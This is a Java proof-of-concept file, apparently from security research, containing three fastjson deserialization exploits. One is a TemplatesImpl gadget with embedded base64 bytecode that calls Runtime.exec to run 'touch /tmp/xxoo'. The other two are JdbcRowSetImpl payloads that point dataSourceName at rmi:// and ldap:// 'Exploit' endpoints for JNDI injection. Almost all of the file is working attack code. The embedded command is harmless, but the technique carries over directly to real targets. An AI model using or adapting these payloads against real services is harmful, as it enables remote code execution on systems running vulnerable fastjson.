package com.fastjson.test;

import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.JSON;
import java.io.IOException;

public class ExpOne {


    public static void main(String[] args) throws IOException {


        ExpOne expOne=new ExpOne();
        expOne.exp1();
        // expOne.exp2();
        // expOne.exp3();
    }

    public void exp1(){
        String text1="{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIcG9jLmphdmEMAAgACQcAIQwAIgAjAQAPdG91Y2ggL3RtcC94eG9vDAAkACUBAANwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACgAEAAsADQAMAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEAABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGAAIABkADAAAAAQAAQAUAAEAFQAAAAIAFg==\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\";";

        String text2 ="{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIcG9jLmphdmEMAAgACQcAIQwAIgAjAQAPdG91Y2ggL3RtcC94eG9vDAAkACUBAANwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACgAEAAsADQAMAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEAABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGAAIABkADAAAAAQAAQAUAAEAFQAAAAIAFg==\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
        Object obj2 = JSON.parseObject(text2, Feature.SupportNonPublicField);
    }

    public void exp2(){


        String  text1="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1022/Exploit\",\"autoCommit\":true}";
        Object  obj2 = JSON.parse(text1);
    }
    public void exp3(){

        String  text1="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1388/Exploit\", \"autoCommit\":true}";
        Object  obj2 = JSON.parse(text1);
    }



}
